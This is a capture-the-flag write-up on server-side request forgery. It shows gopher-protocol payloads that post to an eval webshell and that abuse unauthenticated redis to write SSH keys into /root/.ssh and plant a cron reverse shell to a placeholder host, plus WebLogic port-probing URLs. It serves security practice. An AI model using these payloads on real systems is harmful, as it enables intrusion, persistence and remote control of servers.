# More and more I'm seeing SSRF for CTF's 

### Common attack surface

1. Port scanning can be performed on the external network, the internal network where the server is located, and local to obtain banner information of some services    
2. Attack applications running on the intranet or locally (such as overflow)  
3. Fingerprint identification of intranet WEB applications by accessing default files  
4. Attacks on web applications inside and outside the network, mainly attacks that can be achieved using GET parameters (such as Struts2, sqli, etc.)   
5. Reading local files using the file protocol  

### Extended Attack Surface 
It mainly talks about the attack surface used with the gopher protocol. The gopher protocol can be said to be very powerful.

### Sending post packets via gopher

The gopher protocol can send post packets. How to send it?   
Grab the packet encoding structure. For example, the intranet has an exp.php    
```
<?php 
eval($_POST['a']);
?>
```
Then we set up the environment to access and capture the package locally    
![Capture](https://user-images.githubusercontent.com/25066959/70384218-843b3080-1949-11ea-9862-da111c0d1168.PNG)
Find this request packet and display it in raw data in wireshark and write a script such as the following

```python 
import urllib
from urllib.parse import quote
s='xxxx'
len=len(s)
p=''
for i in range(len)[::2]:
    p+=urllib.parse.quote(chr(int(s[i:i+2],16)))
print(p)
```

and the payload will be something like:    
`gopher://127.0.0.1:80/_POST%20/exp.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Linux%3B%20Android%209.0%3B%20SAMSUNG-SM-T377A%20Build/NMF26X%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/72.0.3626.109%20Mobile%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2C%2A/%2A%3Bq%3D0.8%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AReferer%3A%20http%3A//127.0.0.1/exp.php%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2025%0D%0AConnection%3A%20keep-alive%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0A%0D%0Aa%3Dsystem%2528%2522id%2522%2529%253B`

Test the local curl package    
![Capture](https://user-images.githubusercontent.com/25066959/70384241-fdd31e80-1949-11ea-9d7b-c8ccbd13a98c.PNG)

You can bounce the shell later....

### Root.me 

Visit ctf04.root-me.org and you can see the started virtual environment.
![Capture](https://user-images.githubusercontent.com/25066959/70384432-3c69d880-194c-11ea-8741-3ba932feec69.PNG)
After accessing the address, you can see that the page displays an input box. You need to enter the url parameter to start capturing packets.    
![Capture](https://user-images.githubusercontent.com/25066959/70384450-8488fb00-194c-11ea-8c75-1a163a2deb9d.PNG)
After trying to enter the Baidu address on the page, the page will load the Baidu homepage into this page.    
![Capture](https://user-images.githubusercontent.com/25066959/70384454-98346180-194c-11ea-9551-5cb4ff3fa540.PNG)
Read system files:    
![Capture](https://user-images.githubusercontent.com/25066959/70384455-ab473180-194c-11ea-8df0-4d08c549b7c5.PNG)
Use Burp's Intruder module to detect open service ports. Open will display OK, non-open will display Connection refused.     
![Capture](https://user-images.githubusercontent.com/25066959/70384458-bb5f1100-194c-11ea-8b7f-bbfc22e09c28.PNG)
The probe shows that the redis service on port 6379 is opened on the intranet, and an attempt is made to use SSRF to perform unauthorized vulnerabilities on redis. Here is a simple science popularization of the impact of the redis vulnerability.     

Therefore, this vulnerability can use SSRF to bypass local restrictions without password configuration, thus attacking internal applications on the external network.    

What we do?    
1) Use redis to write ssh keys....    

Here, a pair of public and private keys is generated using ssh, and the default files generated are id_rsa.pub and id_rsa. Upload id_rsa.pub to the server. We use redis to set the directory to the ssh directory:    
There are two protocols available for writing keys online, one is dict and one is gopher. The test failed to write using the dict protocol, and the connection could not be made after writing. Here, a gopher was used to write the key.

The payload used is:    
`gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`

The payload is decoded as:
```
gopher://127.0.0.1:6379/_*3
$3
set
$1
1
$401

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9


*4
$6
config
$3
set
$3
dir
$11
/root/.ssh/
*4
$6
config
$3
set
$10
dbfilename
$15
authorized_keys
*1
$4
save
*1
$4
quit
```
The payload is modified from the rebound shell of joychou, mainly replacing the location and file content of the written file. Then modify the length of the file.    
Then try to log in. After entering the password for creating the key, the login is successful.     
![Capture](https://user-images.githubusercontent.com/25066959/70384476-f8c39e80-194c-11ea-8875-9b4d6399bc7b.PNG)

2) Use redis to write timed tasks to bounce the shell    
`gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/x.x.x.x/2233 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a`
The decoded content is:    
```
gopher://127.0.0.1:6379/_*3
$3
set
$1
1
$61


*/1 * * * * bash -i >& /dev/tcp/x.x.x.x/2233 0>&1


*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
*1
$4
quit
```
$ 61 is my vps address, which is `%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0athe` string length. Wait for a moment after execution to receive a bounce shell. At the same time, you need to add several carriage returns before and after the command to be written.     
![Capture](https://user-images.githubusercontent.com/25066959/70384497-4b04bf80-194d-11ea-9dc7-1f5b44436d05.PNG)
According to the previous tips, open the / passwd file to find the flag.    
![Capture](https://user-images.githubusercontent.com/25066959/70384504-59eb7200-194d-11ea-9b63-ee34d6936768.PNG)
Enter this string of characters on the website page to end this SSRF journey.    

### Vulnhub
go to https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf    
After downloading vulhub, enter the corresponding installation directory and execute `docker-compose up -dit`. A docker image will be created automatically.    

After the build is complete, visit the following address:    
`/uddiexplorer/SearchPublicRegistries.jsp`
![Capture](https://user-images.githubusercontent.com/25066959/70384544-ed24a780-194d-11ea-8288-c4f1708a6fcc.PNG)
Return when accessing the following address, which means the port is not open:    
`/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:80`
![Capture](https://user-images.githubusercontent.com/25066959/70384549-134a4780-194e-11ea-9c2a-6fa2de0ac6b0.PNG)
`/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001`
The response can see a return of 404, which proves that the port is open:    
![Capture](https://user-images.githubusercontent.com/25066959/70384558-2fe67f80-194e-11ea-86ef-67139c68a095.PNG)
Then you can view the open port services based on the traversal, and decide whether to perform an internal network attack based on the open services. In practice, most of the SSRFs used are detection types, because they can be used with the same situation, and they can also be viewed or rebounded. The probability is worth discussing.    

